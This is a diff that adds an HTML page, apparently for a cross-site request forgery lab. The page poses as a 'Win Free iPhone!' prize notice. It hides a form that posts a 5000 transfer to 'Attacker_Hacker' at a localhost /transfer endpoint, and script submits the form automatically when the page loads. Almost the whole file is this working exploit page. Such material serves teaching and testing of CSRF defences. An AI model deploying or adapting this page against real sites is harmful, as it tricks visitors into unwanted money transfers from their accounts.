@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Win Free iPhone!</title>
+</head>
+<body>
+    <h1>Congratulations! You won a Iphone!</h1>
+    <!-- Malicious CSRF trigger will go here -->
+<p>
+    Claim your prize now... </p>
+
+    <form id="expolitForm" action="http://localhost:4000/transfer" method="POST">
+        <input type="hidden" name="recipient" value="Attacker_Hacker">
+        <input type="hidden" name="amount" value="5000">
+    </form>
+</p>
+<script>
+    document.getElementById('expolitForm').submit();
+</script>
+</body>
+</html>
